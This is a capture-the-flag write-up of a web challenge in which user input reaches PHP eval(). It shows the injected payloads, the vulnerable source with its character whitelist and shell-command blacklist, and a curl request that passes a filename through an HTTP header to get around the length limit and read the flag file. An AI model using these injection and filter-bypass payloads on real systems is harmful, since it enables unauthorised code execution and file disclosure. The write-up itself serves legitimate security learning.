# Web-Embedding
URL of the challenge: [http://138.91.58.10/Embedding/] (Embedding)

In the page, we got a input box
```html
<input name="username" placeholder="Enter Your UserName Here">
```

We tried to input 
> getcwd()

The result changed to
> /var/www/html/Embedding welcome

Thus, we knew that the challenge is about <font color="#f03c15"> Eval() Vulnerability </font>\

Then, we put 
> print_r(scandir(getcwd()))
to get all file in this directory.\

The result changed to
> Array ( \[0\] => . \[1\] => .. \[2\] => fl@g.php \[3\] => index.php ) 1 welcome

Finally, we knew that the flag is stored in fl@g.php\

Before we get the source code of fl@g.php, we should know the constants of the input first\

Thus, we typed
> show_source(end(scandir(getcwd())))

```php
<html> 
<head><title>Embedded Challenge </title> </head>
<body>
<form> 
<input name="username" placeholder="Enter Your UserName Here"/>
<input type="Submit"/>
</form>
</body>
</html>

<?php




if(isset($_GET["username"]))
{
    $wl = preg_match('/^[a-z0-9\(\)\_\.\']+$/i', $_GET["username"]);
    $comn=preg_match('/^(rm|cp|mv|cd|grep|find|cat|Y2F0|ZmluZA|cm0|Y3A|bXY|Z3JlcA|whoami|)+$/i', $_GET["username"]);

    if($wl === 0 || $comn===1 || strlen($_GET["username"]) > 40) {
        die("Bad Character Detected or you Break The Limit ");
   }
   $username=$_GET['username'];
    $eval=eval("echo ".$username.";");
    echo(" welcome ".$eval);
}
?> 
```

Thus, we knew that the input only can be\
<font color="#f03c15">a-z</font>, 
<font color="#f03c15">0-9</font>, 
<font color="#f03c15">(</font>, 
<font color="#f03c15">)</font>, 
<font color="#f03c15">_</font>, 
<font color="#f03c15">.</font>, 
<font color="#f03c15">'</font> and the string length must be smaller than 41

First we try that
> read_file(next(array_reverse(scandir('.'))))

However, the string length is 43, we cannot get the result.\

Thus, we found that we can set the header of the request to store variable fl@g/.php\

Then, we use curl command in console to get the source code of fl@g/.php

> curl -s -H "Flag: fl@g.php" "http://138.91.58.10/Embedding/?username=show_source(end(getallheaders()))"

```html 
<html>
<head><title>Embedded Challenge </title> </head>
<body>
<form>
<input name="username" placeholder="Enter Your UserName Here"/>
<input type="Submit"/>
</form>
</body>
</html>

<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />$flag</span><span style="color: #007700">=</span><span style="color: #DD0000">"0xL4ugh{Z!90o_S@y_W3lC0m3}"</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">?&gt;<br /></span>
</span>
</code>1 welcome
```

Finally, we got the flag ^.^

> 0xL4ugh{Z!90o_S@y_W3lC0m3}
